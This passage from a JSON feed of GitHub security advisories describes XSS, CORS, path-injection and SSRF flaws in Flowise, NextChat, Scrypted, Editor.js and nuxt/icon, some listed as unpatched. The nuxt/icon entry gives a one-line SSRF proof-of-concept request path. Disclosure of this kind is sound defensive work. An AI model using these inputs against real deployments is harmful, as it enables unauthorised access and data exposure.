href=\"https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L322-L322\">https://github.com/FlowiseAI/Flowise/blob/flowise-ui%401.4.0/packages/server/src/index.ts#L322-L322</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fccx-2pwj-hrq7\">https://github.com/advisories/GHSA-fccx-2pwj-hrq7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fccx-2pwj-hrq7",
            "title": "[flowise] Flowise Cross-site Scripting in /api/v1/public-chatflows/id",
            "date_modified": "2024-08-05T21:29:29.000Z",
            "date_published": "2024-08-05T21:29:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fccx-2pwj-hrq7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, A CORS misconfiguration sets the Access-Control-Allow-Origin header to all, allowing arbitrary origins to connect to the website. In the default configuration (unauthenticated), arbitrary origins may be able to make requests to Flowise, stealing information from the user. This CORS misconfiguration may be chained with the path injection to allow an attacker attackers without access to Flowise to read arbitrary files from the Flowise server. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36421\">https://nvd.nist.gov/vuln/detail/CVE-2024-36421</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/e93ce07851cdc0fcde12374f301b8070f2043687/packages/server/src/index.ts#L122\">https://github.com/FlowiseAI/Flowise/blob/e93ce07851cdc0fcde12374f301b8070f2043687/packages/server/src/index.ts#L122</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-66f2-xxgm-f6xp\">https://github.com/advisories/GHSA-66f2-xxgm-f6xp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-66f2-xxgm-f6xp",
            "title": "[flowise] Flowise Cors Misconfiguration in packages/server/src/index.ts",
            "date_modified": "2024-08-05T21:29:28.000Z",
            "date_published": "2024-08-05T21:29:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-66f2-xxgm-f6xp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Flowise is a drag &amp; drop user interface to build a customized large language model flow. In version 1.4.3 of Flowise, the <code>/api/v1/openai-assistants-file</code> endpoint in <code>index.ts</code> is vulnerable to arbitrary file read due to lack of sanitization of the <code>fileName</code> body parameter. No known patches for this issue are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36420\">https://nvd.nist.gov/vuln/detail/CVE-2024-36420</a></li>\n<li><a href=\"https://github.com/FlowiseAI/Flowise/blob/e93ce07851cdc0fcde12374f301b8070f2043687/packages/server/src/index.ts#L982\">https://github.com/FlowiseAI/Flowise/blob/e93ce07851cdc0fcde12374f301b8070f2043687/packages/server/src/index.ts#L982</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise\">https://securitylab.github.com/advisories/GHSL-2023-232_GHSL-2023-234_Flowise</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h997-3fxj-p5j8\">https://github.com/advisories/GHSA-h997-3fxj-p5j8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h997-3fxj-p5j8",
            "title": "[flowise] Flowise Path Injection at /api/v1/openai-assistants-file",
            "date_modified": "2024-08-05T21:29:28.000Z",
            "date_published": "2024-08-05T21:29:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h997-3fxj-p5j8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>NextChat, also known as ChatGPT-Next-Web, is a cross-platform chat user interface for use with ChatGPT. Versions 2.11.2 and prior are vulnerable to server-side request forgery and cross-site scripting. This vulnerability enables read access to internal HTTP endpoints but also write access using HTTP POST, PUT, and other methods. Attackers can also use this vulnerability to mask their source IP by forwarding malicious traffic intended for other Internet targets through these open proxies. As of time of publication, no patch is available, but other mitigation strategies are available. Users may avoid exposing the application to the public internet or, if exposing the application to the internet, ensure it is an isolated network with no access to any other internal resources.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49785\">https://nvd.nist.gov/vuln/detail/CVE-2023-49785</a></li>\n<li><a href=\"https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web\">https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web</a></li>\n<li><a href=\"https://www.horizon3.ai/attack-research/attack-blogs/nextchat-an-ai-chatbot-that-lets-you-talk-to-anyone-you-want-to\">https://www.horizon3.ai/attack-research/attack-blogs/nextchat-an-ai-chatbot-that-lets-you-talk-to-anyone-you-want-to</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qf3q-9f3h-cjp9\">https://github.com/advisories/GHSA-qf3q-9f3h-cjp9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qf3q-9f3h-cjp9",
            "title": "[nextchat] NextChat has full-read SSRF and XSS vulnerability in /api/cors endpoint",
            "date_modified": "2024-08-05T21:29:25.000Z",
            "date_published": "2024-08-05T21:29:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qf3q-9f3h-cjp9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Scrypted is a home video integration and automation platform. In versions 0.55.0 and prior, a reflected cross-site scripting vulnerability exists in the plugin-http.ts file via the <code>owner' and 'pkg</code> parameters. An attacker can run arbitrary JavaScript code. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47620\">https://nvd.nist.gov/vuln/detail/CVE-2023-47620</a></li>\n<li><a href=\"https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45\">https://github.com/koush/scrypted/blob/71cbe83a2a20f743342df695ca7b98482b73e60f/server/src/plugin/plugin-http.ts#L45</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-218_GHSL-2023-219_scrypted\">https://securitylab.github.com/advisories/GHSL-2023-218_GHSL-2023-219_scrypted</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xmhh-xrcc-mx36\">https://github.com/advisories/GHSA-xmhh-xrcc-mx36</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xmhh-xrcc-mx36",
            "title": "[@scrypted/server] Scrypted Cross-site Scripting vulnerability",
            "date_modified": "2024-08-05T21:29:23.000Z",
            "date_published": "2024-08-05T21:29:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xmhh-xrcc-mx36"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Scrypted is a home video integration and automation platform. In versions 0.55.0 and prior (corresponding to <code>@scrypted/core</code> 0.1.142 and prior), a reflected cross-site scripting vulnerability exists in the login page via the <code>redirect_uri</code> parameter. By specifying a url with the javascript scheme (<code>javascript:</code>), an attacker can run arbitrary JavaScript code after the login. As of time of publication, no known patches are available.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47623\">https://nvd.nist.gov/vuln/detail/CVE-2023-47623</a></li>\n<li><a href=\"https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79\">https://github.com/koush/scrypted/blob/v0.55.0/plugins/core/ui/src/Login.vue#L79</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2023-218_GHSL-2023-219_scrypted\">https://securitylab.github.com/advisories/GHSL-2023-218_GHSL-2023-219_scrypted</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ww7p-8gfg-v82r\">https://github.com/advisories/GHSA-ww7p-8gfg-v82r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-ww7p-8gfg-v82r",
            "title": "[@scrypted/core] Scrypted Cross-site Scripting vulnerability",
            "date_modified": "2024-08-05T21:29:23.000Z",
            "date_published": "2024-08-05T21:29:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-ww7p-8gfg-v82r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Editor.js is a block-style editor with clean JSON output. Versions prior to 2.26.0 are vulnerable to Code Injection via pasted input. The processHTML method passes pasted input into wrapper’s innerHTML. This issue is patched in version 2.26.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23474\">https://nvd.nist.gov/vuln/detail/CVE-2022-23474</a></li>\n<li><a href=\"https://github.com/codex-team/editor.js/pull/2100\">https://github.com/codex-team/editor.js/pull/2100</a></li>\n<li><a href=\"https://github.com/codex-team/editor.js/commit/f659015be6de8e6f0c322c5ff4d1a4532d2f29a2\">https://github.com/codex-team/editor.js/commit/f659015be6de8e6f0c322c5ff4d1a4532d2f29a2</a></li>\n<li><a href=\"https://securitylab.github.com/advisories\">https://securitylab.github.com/advisories</a></li>\n<li><a href=\"https://securitylab.github.com/advisories/GHSL-2022-028_codex-team_editor_js\">https://securitylab.github.com/advisories/GHSL-2022-028_codex-team_editor_js</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6mvj-2569-3mcm\">https://github.com/advisories/GHSA-6mvj-2569-3mcm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6mvj-2569-3mcm",
            "title": "[@editorjs/editorjs] Editor.js vulnerable to Code Injection",
            "date_modified": "2024-08-05T21:19:01.000Z",
            "date_published": "2024-08-05T21:18:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6mvj-2569-3mcm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>nuxt/icon</code> provides an API to allow client side icon lookup. This endpoint is at <code>/api/_nuxt_icon/[name]</code>.</p>\n<p>The proxied request path is improperly parsed, allowing an attacker to change the scheme and host of the request. This leads to SSRF, and could potentially lead to sensitive data exposure.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>new URL</code> constructor is used to parse the final path. This constructor can be passed a relative scheme or path in order to change the host the request is sent to. This constructor is also very tolerant of poorly formatted URLs.</p>\n<p>As a result we can pass a path prefixed with the string <code>http:</code>. This has the effect of changing the scheme to HTTP. We can then subsequently pass a new host, for example <code>http:127.0.0.1:8080</code>. This would allow us to send requests to a local server. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Make a request to <code>/api/_nuxt_icon/http:example.com</code>, observe the data returned has been fetched from a different resource than intended. </p>\n<p>I typically try to find an example within Nuxt infrastructure that is vulnerable to these types of bugs, but I could not identify any with this endpoint enabled.</p>\n<h3 id=\"impact\">Impact</h3>\n<ul>\n<li>SSRF, potential sensitive data exposure.</li>\n<li>I do not believe this can be chained into an XSS, but it may be possible.</li>\n<li>Does not have a security impact on services deployed on Cloudflare Workers.</li>\n<li>Does not impact certain builds and modes (like static builds).</li>\n<li>Can be mitigated using by disabling the <code>fallbackToApi</code> option.</li>\n</ul>\n<h3 id=\"fix\">Fix</h3>\n<ul>\n<li>Ensure the host has not been changed after the path is parsed.</li>\n<li>Alternatively, prefix the path with <code>./</code>.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/icon/security/advisories/GHSA-cxgv-px37-4mp2\">https://github.com/nuxt/icon/security/advisories/GHSA-cxgv-px37-4mp2</a></li>\n<li><a href=\"https://github.com/nuxt/icon/commit/4564518c2b2ed8235a7715056ccdfce96ca3d0ff\">https://github.com/nuxt/icon/commit/4564518c2b2ed8235a7715056ccdfce96ca3d0ff</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42352\">https://nvd.nist.gov/vuln/detail/CVE-2024-42352</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cxgv-px37-4mp2\">https://github.com/advisories/GHSA-cxgv-px37-4mp2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cxgv-px37-4mp2",
            "title": "[@nuxt/icon] Nuxt Icon affected by a Server-Side Request Forgery (SSRF)",
            "date_modified": "2024-08-06T14:41:55.000Z",
            "date_published": "2024-08-05T19:49:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cxgv-px37-4mp2"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}